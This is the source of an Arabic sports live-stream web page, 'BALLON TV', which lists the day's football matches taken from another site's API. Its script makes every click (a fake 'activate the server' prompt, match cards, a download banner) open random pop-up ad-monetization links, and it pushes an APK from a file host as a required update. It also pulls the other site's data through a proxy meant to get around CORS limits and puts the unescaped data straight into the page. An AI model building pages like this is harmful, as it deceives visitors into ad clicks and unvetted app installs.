<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>BALLON TV | LIVE API PRO</title>

    <!-- الخطوط والأيقونات -->
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>

    <style>
        :root {
            --primary: #d4af37; /* ذهبي ملكي */
            --bg-dark: #01241a; /* أخضر زمردي عميق */
            --surface: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(212, 175, 55, 0.3);
            --text-main: #ffffff;
            --radius: 20px;
            --transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
        }

        ::-webkit-scrollbar { width: 0px; }
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; outline: none; }

        body {
            background-color: var(--bg-dark);
            background-image: radial-gradient(circle at 0% 0%, rgba(212, 175, 55, 0.15) 0%, transparent 40%);
            background-attachment: fixed;
            color: var(--text-main);
            font-family: 'Tajawal', sans-serif;
            margin: 0; padding: 0; overflow-x: hidden;
            user-select: none;
        }

        /* هيدر */
        .app-header {
            position: sticky; top: 0; z-index: 1000;
            background: rgba(1, 36, 26, 0.9); backdrop-filter: blur(15px);
            padding: 12px 25px; display: flex; justify-content: space-between; align-items: center;
            border-bottom: 1px solid var(--glass-border);
        }
        .brand-logo { font-weight: 900; font-size: 1.4rem; color: #fff; font-style: italic; }
        .brand-logo span { color: var(--primary); }

        /* بانر تحميل المشغل (ربح) */
        .download-box {
            background: linear-gradient(135deg, #d4af37, #aa8a2e);
            margin: 15px; padding: 15px 20px; border-radius: var(--radius);
            display: flex; justify-content: space-between; align-items: center;
            color: #000; text-decoration: none; font-weight: 900;
            box-shadow: 0 10px 25px rgba(212, 175, 55, 0.3);
        }

        /* قسم المباريات */
        .section-label { 
            padding: 8px 20px; font-weight: 900; font-size: 1rem; color: #fff; 
            border-right: 4px solid var(--primary); margin: 20px 15px 10px;
            background: rgba(212, 175, 55, 0.05); display: inline-block; border-radius: 0 10px 10px 0;
        }

        .matches-container { display: grid; gap: 12px; padding: 0 15px 100px; max-width: 1200px; margin: 0 auto; }

        /* تصميم كارت المباراة (مستخرج من الـ API) */
        .match-card {
            background: var(--surface); border: 1px solid rgba(212, 175, 55, 0.1);
            border-radius: var(--radius); padding: 15px; display: flex; justify-content: space-between;
            align-items: center; text-decoration: none; transition: var(--transition);
        }
        .match-card:focus, .match-card:hover { 
            background: var(--primary); transform: scale(1.02); outline: none; 
        }
        .match-card:focus .team-name, .match-card:hover .team-name { color: #000; }
        .match-card:focus .match-time, .match-card:hover .match-time { background: #000; color: var(--primary); }

        .team { display: flex; flex-direction: column; align-items: center; width: 35%; gap: 8px; }
        .team img { width: 45px; height: 45px; object-fit: contain; background: #fff; border-radius: 50%; padding: 5px; }
        .team-name { font-size: 0.85rem; font-weight: 800; text-align: center; }

        .match-info { width: 30%; text-align: center; display: flex; flex-direction: column; gap: 5px; }
        .match-time { background: rgba(212, 175, 55, 0.1); padding: 4px 10px; border-radius: 20px; font-size: 0.75rem; font-weight: 900; color: var(--primary); }
        .match-status { font-size: 0.6rem; font-weight: 700; color: #b0c4bc; }

        /* نافذة التنشيط الربحية */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.96); z-index: 10005; 
            display: flex; align-items: center; justify-content: center; padding: 20px;
        }
        .modal-card {
            background: #01241a; border: 2px solid var(--primary);
            border-radius: 30px; max-width: 350px; width: 100%; padding: 30px; text-align: center;
        }
        .modal-btn {
            background: var(--primary); color: #000; padding: 15px; border-radius: 15px;
            margin-top: 20px; font-weight: 900; border: none; width: 100%; cursor: pointer;
        }
    </style>
</head>
<body>

    <div id="activationModal" class="modal-overlay">
        <div class="modal-card animate__animated animate__zoomIn">
            <i class="fa-solid fa-cloud-bolt" style="font-size: 3.5rem; color: var(--primary); margin-bottom: 15px;"></i>
            <h2 style="color: var(--primary);">تنشيط السيرفر PRO</h2>
            <p style="color: #ccc; font-size: 0.85rem;">يجب تنشيط الوصول لبيانات المباريات لليوم لضمان عمل كافة القنوات.</p>
            <button onclick="handleActivation()" class="modal-btn" id="activeBtn">تنشيط الآن</button>
        </div>
    </div>

    <header class="app-header">
        <div class="brand-logo">BALLON <span>TV API</span></div>
        <div id="live-indicator" style="font-size: 0.7rem; color: #ff4b2b;"><i class="fa-solid fa-circle animate__animated animate__flash animate__infinite"></i> مباشر</div>
    </header>

    <a href="javascript:void(0)" onclick="handleProfitAction('https://www.mediafire.com/file/7754umghlhk95sx/BALLONPLAYER-V7.apk/file')" class="download-box animate__animated animate__fadeInDown">
        <div style="display: flex; align-items: center; gap: 12px;">
            <i class="fa-solid fa-download" style="font-size: 1.5rem;"></i>
            <div>
                <div style="font-size: 0.85rem;">تحميل BALLON PLAYER V7</div>
                <div style="font-size: 0.6rem; opacity: 0.8;">تحديث 2027 ضروري للتشغيل</div>
            </div>
        </div>
        <div style="background: #000; color: #fff; padding: 5px 12px; border-radius: 8px; font-size: 0.7rem;">تثبيت</div>
    </a>

    <div class="section-label">مباريات اليوم (تحديث تلقائي)</div>
    <div class="matches-container" id="api-matches">
        <!-- البيانات ستظهر هنا تلقائياً -->
        <div style="text-align: center; padding: 50px; color: var(--primary);" id="loading-msg">جاري جلب البيانات من الـ API...</div>
    </div>

    <div class="section-label">الأقسام الإضافية</div>
    <div class="matches-container">
        <a href="javascript:void(0)" onclick="handleProfitAction('worldcup.html')" class="match-card" tabindex="0">
            <div class="team-name" style="width: 100%; text-align: right; color: var(--primary);">قسم كأس العالم PRO <i class="fa-solid fa-trophy"></i></div>
        </a>
    </div>

    <script>
        // 1. روابط الربح الخمسة الخاصة بك
        const moneyLinks = [
            "https://omg10.com/4/10270118", "https://omg10.com/4/10185036",
            "https://omg10.com/4/9093521", "https://omg10.com/4/9047517", "https://omg10.com/4/10241472"
        ];

        function triggerProfit() {
            const link = moneyLinks[Math.floor(Math.random() * moneyLinks.length)];
            window.open(link, '_blank');
        }

        function handleActivation() {
            triggerProfit();
            document.getElementById('activationModal').style.display = 'none';
            fetchMatches(); // جلب البيانات بعد التنشيط
        }

        function handleProfitAction(url) {
            triggerProfit();
            setTimeout(() => { window.location.href = url; }, 800);
        }

        // 2. وظيفة جلب البيانات تلقائياً من الـ API (استخدام Proxy لكسر حماية CORS)
        async function fetchMatches() {
            const today = new Date();
            const dateStr = `${today.getDate()}-${today.getMonth() + 1}-${today.getFullYear()}`;
            // استخدام AllOrigins كبروكسي لجلب بيانات بطولات
            const btolatApi = `https://www.btolat.com/api/Match/GetMatchesByDate?date=${dateStr}`;
            const proxyUrl = `https://api.allorigins.win/get?url=${encodeURIComponent(btolatApi)}`;

            try {
                const response = await fetch(proxyUrl);
                const result = await response.json();
                const data = JSON.parse(result.contents); // البيانات الحقيقية

                const container = document.getElementById('api-matches');
                container.innerHTML = ''; // مسح رسالة التحميل

                // الدوران حول الدوريات والمباريات
                data.forEach(league => {
                    league.matches.forEach(match => {
                        const card = document.createElement('a');
                        card.href = "javascript:void(0)";
                        card.className = "match-card animate__animated animate__fadeInUp";
                        card.setAttribute('tabindex', '0');
                        card.onclick = () => handleProfitAction(`go:${match.id}`);

                        card.innerHTML = `
                            <div class="team">
                                <img src="${match.team1Logo}" onerror="this.src='https://img.btolat.com/tourlogo/84aa6db5-64e9-439b-a595-2040420fa1e2.png'">
                                <span class="team-name">${match.team1Name}</span>
                            </div>
                            <div class="match-info">
                                <span class="match-time">${match.matchTime}</span>
                                <span class="match-status">${match.matchStatusName || 'اليوم'}</span>
                                <div style="font-size: 0.6rem; color: var(--primary);">${league.leagueName}</div>
                            </div>
                            <div class="team">
                                <img src="${match.team2Logo}" onerror="this.src='https://img.btolat.com/tourlogo/84aa6db5-64e9-439b-a595-2040420fa1e2.png'">
                                <span class="team-name">${match.team2Name}</span>
                            </div>
                        `;
                        container.appendChild(card);
                    });
                });
            } catch (error) {
                document.getElementById('loading-msg').innerHTML = "عذراً، فشل جلب البيانات تلقائياً. تأكد من اتصالك بالإنترنت.";
            }
        }

        // 3. نظام الريموت كنترول
        document.addEventListener('keydown', (e) => {
            const focusable = Array.from(document.querySelectorAll('[tabindex="0"], button, .download-box'));
            let index = focusable.indexOf(document.activeElement);
            if (e.key === 'ArrowDown' || e.key === 'ArrowRight') {
                index = (index + 1) % focusable.length; focusable[index].focus(); e.preventDefault();
            } else if (e.key === 'ArrowUp' || e.key === 'ArrowLeft') {
                index = (index - 1 + focusable.length) % focusable.length; focusable[index].focus(); e.preventDefault();
            } else if (e.key === 'Enter') {
                document.activeElement.click();
            }
        });

        window.onload = () => { document.getElementById('activeBtn').focus(); };
    </script>
</body>
</html>
